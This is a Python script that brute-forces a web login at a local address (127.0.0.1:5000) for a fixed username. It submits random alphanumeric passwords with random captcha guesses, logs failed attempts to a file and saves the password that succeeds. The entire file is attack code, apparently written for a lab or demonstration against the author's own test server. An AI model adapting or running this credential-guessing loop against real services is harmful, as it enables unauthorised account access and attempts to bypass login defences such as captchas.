import requests
import random

url = 'http://127.0.0.1:5000/login'

def attempt_login(username, password, captcha):
    attempt = {'username': username, 'password': password, 'captcha': captcha}
    r = requests.post(url, data=attempt)
    return r

characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
username = 'safwan' # Assuming the attacker knows the username

def main():
    while True:
        valid = False
        while not valid:
            generate_password = random.choices(characters, k=random.randint(4, 20)) #random.randint(4, 20)
            password = "".join(generate_password)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if password in tries:
                pass
            else:
                valid = True

        generate_captcha = random.choices(characters, k=4)
        captcha = "".join(generate_captcha)
        r = attempt_login(username, password, captcha)
        if r.status_code == 302:
            print(f"Success! Username: {username}, Password: {password}")
            with open("correct_password.txt", "w") as f:
                f.write(f"{password}\n")
                f.close()
            exit()
        else:
            with open("tries.txt", "a") as f:
                f.write(f"{password}\n")
                f.close()
            print(f"Wrong! Username: {username}, Password: {password}")

if __name__ == '__main__':
    main()
